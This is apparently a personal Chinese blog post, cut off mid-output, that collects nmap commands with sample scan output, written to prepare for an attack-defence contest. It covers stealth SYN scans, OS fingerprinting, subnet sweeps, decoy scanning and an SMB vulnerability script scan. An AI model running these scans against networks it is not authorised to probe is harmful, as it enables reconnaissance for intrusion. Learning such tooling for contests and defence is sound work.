<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta property="og:type" content="website">
<meta property="og:title" content="V&#39;s blog">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="V&#39;s blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="V&#39;s blog">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/">





  <title>V's blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">V's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/22/nmap/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="V">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="V's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/22/nmap/" itemprop="url">nmap</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-22T16:07:55+08:00">
                2019-07-22
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>后天要参加人生第一次awd线下攻防了，今天赶紧突击一下，先学习一下nmap的一些常规操作</p>
<h3 id="引入："><a href="#引入：" class="headerlink" title="引入："></a>引入：</h3><p><strong>1) 获取远程主机的系统类型及开放端口</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -P0 -sV -O &lt;target&gt;</span><br></pre></td></tr></table></figure>

<p>这里的 &lt; target &gt; 可以是单一 IP, 或主机名，或域名，或子网</p>
<p>-sS TCP SYN 扫描 (又称半开放,或隐身扫描)<br>-P0 允许你关闭 ICMP pings.<br>-sV 打开系统版本检测<br>-O 尝试识别远程操作系统</p>
<p>其它选项:</p>
<p>-A 同时打开操作系统指纹和版本检测<br>-v 详细输出扫描情况.</p>
<p><strong>2) 列出开放了指定端口的主机列表</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -p 80 -oG – 192.168.1.* | grep open</span><br></pre></td></tr></table></figure>

<p><strong>3) 在网络寻找所有在线主机</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.0.*</span><br></pre></td></tr></table></figure>

<p>或者也可用以下命令:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.0.0/24</span><br></pre></td></tr></table></figure>

<p>指定 subnet</p>
<p><strong>4) Ping 指定范围内的 IP 地址</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.1.100-254</span><br></pre></td></tr></table></figure>

<p><strong>5) 在某段子网上查找未占用的 IP</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sP 192.168.2.0/24 &amp;&amp; egrep “00:00:00:00:00:00″ /proc/net/arp</span><br></pre></td></tr></table></figure>

<p><strong>6) 在局域网上扫找 Conficker 蠕虫病毒</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PN -T4 -p139,445 -n -v –script=smb-check-vulns –script-args safe=1 192.168.0.1-254</span><br></pre></td></tr></table></figure>

<p><strong>7) 扫描网络上的恶意接入点 （rogue APs）.</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p1-85,113,443,8080-8100 -T4 –min-hostgroup 50 –max-rtt-timeout</span><br><span class="line">2000 –initial-rtt-timeout 300 –max-retries 3 –host-timeout 20m</span><br><span class="line">–max-scan-delay 1000 -oA wapscan 10.0.0.0/8</span><br></pre></td></tr></table></figure>

<p><strong>8 ) 使用诱饵扫描方法来扫描主机端口</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS 192.168.0.10 -D 192.168.0.2</span><br></pre></td></tr></table></figure>

<p><strong>9) 为一个子网列出反向DNS记录</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -R -sL 209.85.229.99/27 | awk ‘&#123;if($3==”not”)print”(“$2″) no PTR”;else print$3″ is “$2&#125;’ | grep ‘(‘</span><br></pre></td></tr></table></figure>

<p><strong>10) 显示网络上共有多少台 Linux 及 Win 设备?</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -F -O 192.168.0.1-255 | grep “Running: ” &gt; /tmp/os; echo “$(cat /tmp/os | grep Linux \</span><br><span class="line">| wc -l) Linux device(s)”; echo “$(cat /tmp/os | grep Windows | wc -l) Window(s) device”</span><br></pre></td></tr></table></figure>

<p>### </p>
<h3 id="1-用主机名和IP地址扫描系统"><a href="#1-用主机名和IP地址扫描系统" class="headerlink" title="1. 用主机名和IP地址扫描系统"></a>1. 用主机名和IP地址扫描系统</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap server2.tecmint.com（192.168.0.101）</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 15:42 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 0.415 seconds</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="2-扫描使用“-v”选项"><a href="#2-扫描使用“-v”选项" class="headerlink" title="2.扫描使用“-v”选项"></a>2.扫描使用“-v”选项</h3><p>你可以看到下面的命令使用“ <strong>-</strong>v “选项后给出了远程机器更详细的信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -v server2.tecmint.com</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 15:43 EST</span><br><span class="line">Initiating ARP Ping Scan against 192.168.0.101 [1 port] at 15:43</span><br><span class="line">The ARP Ping Scan took 0.01s to scan 1 total hosts.</span><br><span class="line">Initiating SYN Stealth Scan against server2.tecmint.com (192.168.0.101) [1680 ports] at 15:43</span><br><span class="line">Discovered open port 22/tcp on 192.168.0.101</span><br><span class="line">Discovered open port 80/tcp on 192.168.0.101</span><br><span class="line">Discovered open port 8888/tcp on 192.168.0.101</span><br><span class="line">Discovered open port 111/tcp on 192.168.0.101</span><br><span class="line">Discovered open port 3306/tcp on 192.168.0.101</span><br><span class="line">Discovered open port 957/tcp on 192.168.0.101</span><br><span class="line">The SYN Stealth Scan took 0.30s to scan 1680 total ports.</span><br><span class="line">Host server2.tecmint.com (192.168.0.101) appears to be up ... good.</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 0.485 seconds</span><br><span class="line">               Raw packets sent: 1681 (73.962KB) | Rcvd: 1681 (77.322KB)</span><br></pre></td></tr></table></figure>

<h3 id="3-扫描多台主机"><a href="#3-扫描多台主机" class="headerlink" title="3.扫描多台主机"></a>3.扫描多台主机</h3><p>你可以简单的在Nmap命令后加上多个IP地址或主机名来扫描多台主机。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap 192.168.0.101 192.168.0.102 192.168.0.103 </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 16:06 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line">Nmap finished: 3 IP addresses (1 host up) scanned in 0.580 seconds</span><br></pre></td></tr></table></figure>

<h3 id="4-扫描整个子网"><a href="#4-扫描整个子网" class="headerlink" title="4.扫描整个子网 *"></a>4.扫描整个子网 *</h3><p>你可以使用*通配符来扫描整个子网或某个范围的IP地址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap 192.168.0.*</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 16:11 EST</span><br><span class="line">Interesting ports on server1.tecmint.com (192.168.0.100):</span><br><span class="line">Not shown: 1677 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">111/tcp open  rpcbind</span><br><span class="line">851/tcp open  unknown</span><br><span class="line"> </span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 256 IP addresses (2 hosts up) scanned in 5.550 seconds</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="5-使用IP地址的最后一个字节扫描多台服务器-，"><a href="#5-使用IP地址的最后一个字节扫描多台服务器-，" class="headerlink" title="5.使用IP地址的最后一个字节扫描多台服务器 ，"></a>5.使用IP地址的最后一个字节扫描多台服务器 ，</h3><p>你可以简单的指定IP地址的最后一个字节来对多个IP地址进行扫描。例如，我在下面执行中扫描了IP地址192.168.0.101，192.168.0.102和192.168.0.103。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap 192.168.0.101,102,103 </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 16:09 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 3 IP addresses (1 host up) scanned in 0.552 seconds</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="6-从一个文件中扫描主机列表-iL"><a href="#6-从一个文件中扫描主机列表-iL" class="headerlink" title="6. 从一个文件中扫描主机列表 -iL"></a>6. 从一个文件中扫描主机列表 -iL</h3><p>如果你有多台主机需要扫描且所有主机信息都写在一个文件中，那么你可以直接让nmap读取该文件来执行扫描，让我们来看看如何做到这一点。</p>
<p>创建一个名为“nmaptest.txt ”的文本文件，并定义所有你想要扫描的服务器IP地址或主机名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# cat  nmaptest.txt </span><br><span class="line">localhost</span><br><span class="line">server2.tecmint.com</span><br><span class="line">192.168.0.101</span><br></pre></td></tr></table></figure>

<p>接下来运行带“iL”选项的nmap命令来扫描文件中列出的所有IP地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -iL nmaptest.txt </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-18 10:58 EST</span><br><span class="line">Interesting ports on localhost.localdomain (127.0.0.1):</span><br><span class="line">Not shown: 1675 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">25/tcp  open  smtp</span><br><span class="line">111/tcp open  rpcbind</span><br><span class="line">631/tcp open  ipp</span><br><span class="line">857/tcp open  unknown</span><br><span class="line"> </span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">958/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems) </span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">958/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems) </span><br><span class="line">Nmap finished: 3 IP addresses (3 hosts up) scanned in 2.047 seconds</span><br></pre></td></tr></table></figure>

<h3 id="7-扫描一个IP地址范围"><a href="#7-扫描一个IP地址范围" class="headerlink" title="7.扫描一个IP地址范围 -"></a>7.扫描一个IP地址范围 -</h3><p>你可以在nmap执行扫描时指定IP范围。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap 192.168.0.101-110 </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 16:09 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems) </span><br><span class="line">Nmap finished: 10 IP addresses (1 host up) scanned in 0.542 seconds</span><br></pre></td></tr></table></figure>

<h3 id="8-排除一些远程主机后再扫描–exclude"><a href="#8-排除一些远程主机后再扫描–exclude" class="headerlink" title="8.排除一些远程主机后再扫描–exclude"></a>8.排除一些远程主机后再扫描–exclude</h3><p>在执行全网扫描或用通配符扫描时你可以使用“–exclude”选项来排除某些你不想要扫描的主机。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap 192.168.0.* --exclude 192.168.0.100</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 16:16 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  unknown</span><br><span class="line">3306/tcp open  mysql</span><br><span class="line">8888/tcp open  sun-answerbook</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 255 IP addresses (1 host up) scanned in 5.313 seconds</span><br><span class="line">You have new mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure>

<h3 id="9-扫描操作系统信息和路由跟踪-A"><a href="#9-扫描操作系统信息和路由跟踪-A" class="headerlink" title="9.扫描操作系统信息和路由跟踪-A"></a>9.扫描操作系统信息和路由跟踪-A</h3><p>使用Nmap，你可以检测远程主机上运行的操作系统和版本。为了启用操作系统和版本检测，脚本扫描和路由跟踪功能，我们可以使用NMAP的“<strong>-A</strong>“选项。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -A 192.168.0.101</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 16:25 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 4.3 (protocol 2.0)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.2.3 ((CentOS))</span><br><span class="line">111/tcp  open  rpcbind  2 (rpc #100000)</span><br><span class="line">957/tcp  open  status   1 (rpc #100024)</span><br><span class="line">3306/tcp open  mysql   MySQL (unauthorized)</span><br><span class="line">8888/tcp open  http    lighttpd 1.4.32</span><br><span class="line">MAC Address: 08:00:27:D9:8E:D7 (Cadmus Computer Systems)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see http://www.insecure.org/cgi-bin/nmap-submit.cgi).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">SInfo(V=4.11%P=i686-redhat-linux-gnu%D=11/11%Tm=52814B66%O=22%C=1%M=080027)</span><br><span class="line">TSeq(Class=TR%IPID=Z%TS=1000HZ)</span><br><span class="line">T1(Resp=Y%DF=Y%W=16A0%ACK=S++%Flags=AS%Ops=MNNTNW)</span><br><span class="line">T2(Resp=N)</span><br><span class="line">T3(Resp=Y%DF=Y%W=16A0%ACK=S++%Flags=AS%Ops=MNNTNW)</span><br><span class="line">T4(Resp=Y%DF=Y%W=0%ACK=O%Flags=R%Ops=)</span><br><span class="line">T5(Resp=Y%DF=Y%W=0%ACK=S++%Flags=AR%Ops=)</span><br><span class="line">T6(Resp=Y%DF=Y%W=0%ACK=O%Flags=R%Ops=)</span><br><span class="line">T7(Resp=Y%DF=Y%W=0%ACK=S++%Flags=AR%Ops=)</span><br><span class="line">PU(Resp=Y%DF=N%TOS=C0%IPLEN=164%RIPTL=148%RID=E%RIPCK=E%UCK=E%ULEN=134%DAT=E)</span><br><span class="line"> </span><br><span class="line">Uptime 0.169 days (since Mon Nov 11 12:22:15 2013)</span><br><span class="line"> </span><br><span class="line">Nmap finished: 1 IP address (1 host up) scanned in 22.271 seconds</span><br></pre></td></tr></table></figure>

<p>从上面的输出你可以看到，Nmap显示出了远程主机<strong>操作系统的TCP</strong> / <strong>IP</strong>协议指纹，并且更加具体的显示出远程主机上的端口和服务。</p>
<h3 id="10-启用Nmap的操作系统探测功能-O"><a href="#10-启用Nmap的操作系统探测功能-O" class="headerlink" title="10.启用Nmap的操作系统探测功能-O"></a>10.启用Nmap的操作系统探测功能-O</h3><p>使用选项“<strong>-O</strong>”和“<strong>-osscan-guess</strong>”也帮助探测操作系统信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# nmap -O server2.tecmint.com</span><br><span class="line"> </span><br><span class="line">Starting Nmap 4.11 ( http://www.insecure.org/nmap/ ) at 2013-11-11 17:40 EST</span><br><span class="line">Interesting ports on server2.tecmint.com (192.168.0.101):</span><br><span class="line">Not shown: 1674 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">111/tcp  open  rpcbind</span><br><span class="line">957/tcp  open  